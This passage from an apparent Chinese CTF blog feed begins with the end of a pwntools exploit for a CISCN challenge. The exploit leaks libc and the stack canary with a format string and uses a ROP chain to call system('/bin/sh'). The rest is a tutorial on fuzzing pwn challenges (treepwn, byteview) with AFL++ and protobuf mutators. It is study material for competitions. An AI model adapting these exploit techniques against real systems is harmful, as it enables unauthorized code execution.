class="built_in">format</span>(name, addr))</span><br><span class="line">fmt =<span class="keyword">lambda</span> string:<span class="built_in">eval</span>(<span class="string">f&quot;f&#x27;&#x27;&#x27;<span class="subst">&#123;string&#125;</span>&#x27;&#x27;&#x27;&quot;</span>, <span class="built_in">globals</span>()).encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line"><span class="keyword">if</span>(script):</span><br><span class="line">gdb.attach(p, script)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line"><span class="keyword">return</span> process(elf_path)</span><br><span class="line"><span class="keyword">return</span> remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">name</span>):</span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,tbs(<span class="number">4</span>))</span><br><span class="line">sla(<span class="string">b&#x27;Data name:&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">name,content</span>):</span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,tbs(<span class="number">3</span>))</span><br><span class="line">sla(<span class="string">b&#x27;Data name:&#x27;</span>,name)</span><br><span class="line">sla(<span class="string">b&#x27;data len:&#x27;</span>,tbs(<span class="built_in">len</span>(content)))</span><br><span class="line">sa(<span class="string">b&#x27;data:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Init Data size: \n&#x27;</span>,tbs(<span class="number">120</span>))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Your Json:\n&#x27;</span>,<span class="string">b&#x27;&#123;&quot;a&quot;:&quot;b&quot;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">b&#x27;%p%25$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.address=<span class="built_in">int</span>(ru(<span class="string">&#x27;23&#x27;</span>)[-<span class="number">12</span>:],<span class="number">16</span>)-<span class="number">0x1ED723</span></span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line">canary=<span class="built_in">int</span>(ru(<span class="string">&#x27;]&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">16</span>:],<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi_ret=libc.address+<span class="number">0x23b6a</span></span><br><span class="line">ret=libc.address+<span class="number">0x23b6b</span></span><br><span class="line">binsh=<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#dbg(&#x27;b *$rebase(0x15B6)&#x27;)</span></span><br><span class="line">edit(<span class="string">b&#x27;ixout&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">632</span>+p64(canary)+p64(<span class="number">0</span>)+p64(pop_rdi_ret)+p64(binsh)+p64(ret)+p64(system))</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">热</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="ciscn" scheme="https://ixout.github.io/tags/ciscn/"/>
    
  </entry>
  
  <entry>
    <title>fuzz-in-pwn</title>
    <link href="https://ixout.github.io/posts/53981/"/>
    <id>https://ixout.github.io/posts/53981/</id>
    <published>2024-05-12T14:29:46.000Z</published>
    <updated>2024-05-21T08:56:35.933Z</updated>
    
    <content type="html"><![CDATA[<p>在一些逆向难度较高的题目中,例如rust,go或cpp之类写就的题目,也许我们并不一定要花大量的时间去逆向搞懂程序到底是怎样的,漏洞又是怎么出现的</p><p>只需要找到稳定的触发漏洞的方法即可,那么在搞不清楚程序在干什么的情况下如何去找到漏洞,我们可以运用fuzz的思想,进行大量的测试,以此找到漏洞点</p><p>以几道题目为例学习一下思路</p><p><a href="https://www.cjovi.icu/fuzzing/1589.html">BYTECTF2021-byteview - blog of chuj (cjovi.icu)</a></p><p><a href="https://www.cjovi.icu/wp/1617.html">虎符网络安全赛道 2022-pwn-vdq-WP - blog of chuj (cjovi.icu)</a></p><p><a href="https://bbs.kanxue.com/thread-273516.htm#msg_header_h1_2">从Fuzz到XCTF赛题-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p><p><a href="https://kiprey.github.io/2021/09/protobuf_ctf_fuzz/">使用 protobuf &amp; AFLplusplus 进行简易 CTF 自动化 fuzz | Kiprey’s Blog</a></p><p>师傅们真是tql</p><h1 id="2022ACTF-treepwn"><a href="#2022ACTF-treepwn" class="headerlink" title="2022ACTF-treepwn"></a>2022ACTF-treepwn</h1><p>题目静态分析的话会有一大坨平衡树算法的代码</p><p>看得十分头大,不说要先学会相关数据结构,学会之后还要逆向分析出这个程序</p><p>着实有点难受了,这时候就可以使用模糊测试的思路进行漏洞挖掘</p><p>题目启动后是这样</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  [..                                                          </span><br><span class="line">  [..                                                          </span><br><span class="line">[.[. [.[. [...   [..       [..    [. [..  [..     [...[.. [..  </span><br><span class="line">  [..   [..    [.   [..  [.   [.. [.  [..  [..  .  [.. [..  [..</span><br><span class="line">  [..   [..   [..... [..[..... [..[.   [.. [.. [.  [.. [..  [..</span><br><span class="line">  [..   [..   [.        [.        [.. [..  [. [. [.[.. [..  [..</span><br><span class="line">   [.. [...     [....     [....   [..     [...    [...[...  [..</span><br><span class="line">                                  [..</span><br><span class="line">You can place some elements <span class="keyword">in</span> 0 - 4096 size square</span><br><span class="line"></span><br><span class="line">Choice Table</span><br><span class="line">[ 0 ] Place a element</span><br><span class="line">[ 1 ] Remove a element</span><br><span class="line">[ 2 ] Edit a element</span><br><span class="line">[ 3 ] Show a element</span><br><span class="line">[ 4 ] Query a element</span><br><span class="line">[ 5 ] Leave</span><br><span class="line">Your choice &gt; </span><br></pre></td></tr></table></figure><p>并且交互操作的逆向并不困难</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cho</span>(<span class="params">num</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x,y,name</span>):</span><br><span class="line">    cho(<span class="number">0</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;value: &quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;value: &quot;</span>,<span class="built_in">str</span>(y))</span><br><span class="line">    r.sendafter(<span class="string">&quot;new element name: &quot;</span>,name.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">x,y</span>):</span><br><span class="line">    cho(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;want element x-coordinate value: &quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;want element y-coordinate value: &quot;</span>,<span class="built_in">str</span>(y))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">x,y,name</span>):</span><br><span class="line">    cho(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;want element x-coordinate value: &quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;want element y-coordinate value: &quot;</span>,<span class="built_in">str</span>(y))</span><br><span class="line">    r.sendafter(<span class="string">&quot;name: &quot;</span>,name.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">x,y</span>):</span><br><span class="line">    cho(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;value&#x27;</span>,<span class="built_in">str</span>(x))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;value&#x27;</span>,<span class="built_in">str</span>(y))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">a,b,c,d</span>):</span><br><span class="line">    cho(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;value: &quot;</span>,<span class="built_in">str</span>(a))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;value: &quot;</span>,<span class="built_in">str</span>(b))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;value: &quot;</span>,<span class="built_in">str</span>(c))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;value: &quot;</span>,<span class="built_in">str</span>(d))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fuzz</span>():</span><br><span class="line"> f=<span class="built_in">open</span>(<span class="string">&#x27;./log.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>):</span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">10</span>==<span class="number">0</span>):</span><br><span class="line">        a = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">        b = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">        add(a,b,<span class="built_in">str</span>(i)) </span><br><span class="line">        data0=r.recvuntil(<span class="string">&#x27;Choice Table&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;two many&#x27;</span> <span class="keyword">in</span> data0:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">            r.close()</span><br><span class="line">            <span class="keyword">break</span>           </span><br><span class="line">        f.write(<span class="string">&#x27; add(&#123;&#125;,&#123;&#125;,str(&#123;&#125;))\n&#x27;</span>.<span class="built_in">format</span>(a,b,i))</span><br><span class="line">    <span class="keyword">elif</span>(i%<span class="number">2</span>==<span class="number">0</span>):</span><br><span class="line">        a = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">        b = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">        delet(a,b)</span><br><span class="line">        data0=r.recvline()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;not exists&#x27;</span> <span class="keyword">in</span> data0:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        f.write(<span class="string">&#x27; delet(&#123;&#125;,&#123;&#125;)\n&#x27;</span>.<span class="built_in">format</span>(a,b))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"> f.close()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>: </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r=process(<span class="string">&#x27;./treepwn&#x27;</span>)</span><br><span class="line">fuzz()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>之后通过分析log日志即可快速对点对应进行逆向分析</p><p>多跑几次就能出结果</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x29 bytes:</span><br><span class="line">    <span class="string">&#x27;free(): double free detected in tcache 2\n&#x27;</span></span><br><span class="line">[*] Stopped process <span class="string">&#x27;./treepwn&#x27;</span> (pid 552537)</span><br></pre></td></tr></table></figure><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>在进入下一题之前先安装一下环境</p><p>最主要的就是安装一下<a href="https://github.com/thebabush/afl-libprotobuf-mutator">afl-libprotobuf-mutator</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/thebabush/afl-libprotobuf-mutator.git</span><br><span class="line"><span class="built_in">cd</span> afl-libprotobuf-mutator</span><br><span class="line">./build.sh</span><br></pre></td></tr></table></figure><p>这里有一个坑就是这个库有点久没维护了,导致其依赖的<a href="https://github.com/google/libprotobuf-mutator">libprotobuf-mutator</a>已经迭代好几个版本了,如果直接安装会产生一大坨问题,例如C++标准不匹配,absl库依赖不对….</p><p>自己尝试了一下没能解决,于是认怂,选择安装旧版v1.0,就没有这些问题了</p><p>那么如何使用这个库?</p><p>首先需要我们根据题目的逆向分析,写出对应的proto文件<code>out.proto</code>,放置在<code>gen</code>目录</p><p>再配置afl-libprotobuf-mutator代码<code>mutator.cc</code>,放置在<code>src</code>目录</p><p>最后配置测试代码<code>dump.cc</code>,放置在<code>src</code>目录</p><p>之后执行<code>make</code>即可编译出三个对应文件</p><p>再然后执行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> AFL_CUSTOM_MUTATOR_ONLY=1</span><br><span class="line"><span class="built_in">export</span> AFL_CUSTOM_MUTATOR_LIBRARY=$(<span class="built_in">pwd</span>)/libmutator.so</span><br><span class="line"><span class="built_in">export</span> AFL_USE_QASAN=1</span><br></pre></td></tr></table></figure><p>即可开始Fuzz</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AFLplusplus/afl-fuzz -i input -o output -Q -- /pwd/binary</span><br></pre></td></tr></table></figure><p>更多可见README.md</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>由于qemu-trace不支持内部 mmap 定向内存分配以及prctl 调用，会被直接 exit 掉，这样会出错,所以如果题目和这两个东西绑的比较深就用不了这种方法,当然可以通过patch掉相关代码以继续,但这样结果也就不甚准确了</p><h1 id="BYTECTF2021-byteview"><a href="#BYTECTF2021-byteview" class="headerlink" title="BYTECTF2021-byteview"></a>BYTECTF2021-byteview</h1><p>上一道题目,我们只是使用了fuzz的思路,但并没有真正的进行结构化fuzz</p><p>程序是C++写的,静态分析逆向的话较难看出漏洞</p><p>于是再次使用fuzz的思路去寻找漏洞</p><p>chuj师傅提供了两种方法</p><h2 id="利用AFLFUzz"><a href="#利用AFLFUzz" class="headerlink" title="利用AFLFUzz"></a>利用AFLFUzz</h2><p>首先根据题目的逆向写出对应的proto文件,只要有一个模板照着改改就是了</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> menuctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">New_content</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">int32</span> choice_id = <span class="number">1</span> [default = <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">required</span> <span class="type">int32</span> sum_of_datas = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">message </span><span class="title class_">data</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">required</span> <span class="type">int32</span> key = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">required</span> <span class="type">int32</span> size = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">repeated</span> data datas = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Edit_message</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">int32</span> choice_id = <span class="number">1</span> [default = <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">required</span> <span class="type">int32</span> key = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">string</span> content = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Show_message</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">int32</span> choice_id = <span class="number">1</span> [default = <span class="number">3</span>];</span><br><span class="line">    <span class="keyword">required</span> <span class="type">int32</span> key = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Old_content</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">int32</span> choice_id = <span class="number">1</span> [default = <span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Content_info</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">int32</span> choice_id = <span class="number">1</span> [default = <span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Exit</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">int32</span> choice_id = <span class="number">1</span> [default = <span class="number">6</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Choices</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">message </span><span class="title class_">Choice</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">oneof</span> all_choices</span><br><span class="line">        &#123;</span><br><span class="line">            New_content new_content = <span class="number">1</span>;</span><br><span class="line">            Edit_<span class="keyword">message </span><span class="title class_">edit_message</span> = <span class="number">2</span>;</span><br><span class="line">            Show_<span class="keyword">message </span><span class="title class_">show_message</span> = <span class="number">3</span>;</span><br><span class="line">            Old_content old_content = <span class="number">4</span>;</span><br><span class="line">            Content_info content_info = <span class="number">5</span>; </span><br><span class="line">            Exit exit = <span class="number">6</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">repeated</span> Choice choice = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于CTF题来说，大多都是直接从 stdin 中获取输入的<strong>文本数据</strong>。因此首先，我们需要编写 <code>Protobuf::Message</code> 转<strong>常规输入字符串</strong>的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ProtoToDataHelper</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">stringstream</span> &amp;out, <span class="type">const</span> google::protobuf::Message &amp;msg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> google::protobuf::Descriptor *desc = msg.GetDescriptor();</span><br><span class="line"><span class="type">const</span> google::protobuf::Reflection *refl = msg.GetReflection();</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> fields = desc-&gt;field_count();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> i = <span class="number">0</span>; i &lt; fields; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> google::protobuf::FieldDescriptor *field = desc-&gt;field(i);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (field-&gt;cpp_type() == google::protobuf::FieldDescriptor::CPPTYPE_MESSAGE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (field-&gt;is_repeated())</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// maybe choice list or data list</span></span><br><span class="line"><span class="type">const</span> google::protobuf::RepeatedFieldRef&lt;google::protobuf::Message&gt; &amp;ptr = refl-&gt;GetRepeatedFieldRef&lt;google::protobuf::Message&gt;(msg, field);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span> &amp;child : ptr)</span><br><span class="line">&#123;</span><br><span class="line">ProtoToDataHelper(out, child);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (refl-&gt;HasField(msg, field))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// maybe one choice or one data</span></span><br><span class="line"><span class="type">const</span> google::protobuf::Message &amp;child = refl-&gt;GetMessage(msg, field);</span><br><span class="line">ProtoToDataHelper(out, child);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (field-&gt;cpp_type() ==</span><br><span class="line"> google::protobuf::FieldDescriptor::CPPTYPE_INT32)</span><br><span class="line">&#123;</span><br><span class="line">out.width(<span class="number">8</span>);</span><br><span class="line">out &lt;&lt; refl-&gt;GetInt32(msg, field);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (field-&gt;cpp_type() ==</span><br><span class="line"> google::protobuf::FieldDescriptor::CPPTYPE_STRING)</span><br><span class="line">&#123;</span><br><span class="line">out &lt;&lt; refl-&gt;GetString(msg, field) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的主要功能是将protobuf消息的各个字段转换为字符串，并将其输出到一个字符串流中。它支持嵌套消息和重复字段。</p><p>由于目标程序使用 read 读入，所以最好填充满 read，所以这里在对 int32 进行输出的时候，设置了 8 的场宽，填充空格即可，因为程序使用 strtol 这类的函数，所以仍然可以正常输入,因为如果不这样的话,下一次的数据可能被同一个read读走</p><details class="folding-tag" cyan><summary> 更多关于此函数 </summary>              <div class='content'>              <p><strong>具体例子</strong></p><p>假设我们有以下 Protobuf 消息定义：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Data</span> &#123;</span><br><span class="line">    <span class="type">int32</span> id = <span class="number">1</span>;</span><br><span class="line">    <span class="type">string</span> content = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Container</span> &#123;</span><br><span class="line">    <span class="keyword">repeated</span> Data items = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们创建一个包含一些数据的 <code>Container</code> 对象：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Container container;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i) &#123;</span><br><span class="line">    Data* data = container.<span class="built_in">add_items</span>();</span><br><span class="line">    data-&gt;<span class="built_in">set_id</span>(i);</span><br><span class="line">    data-&gt;<span class="built_in">set_content</span>(<span class="string">&quot;Content &quot;</span> + std::<span class="built_in">to_string</span>(i));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们调用 <code>ProtoToDataHelper</code> 函数处理这个对象：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">std::stringstream stream;</span><br><span class="line"><span class="built_in">ProtoToDataHelper</span>(stream, container);</span><br><span class="line">std::string result = stream.<span class="built_in">str</span>();</span><br></pre></td></tr></table></figure><p>我们来详细看一下 <code>ProtoToDataHelper</code> 函数的执行过程：</p><p><strong>执行步骤</strong></p><ol><li><strong>获取描述符和反射器</strong>：</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> google::protobuf::Descriptor *desc = msg.<span class="built_in">GetDescriptor</span>();</span><br><span class="line"><span 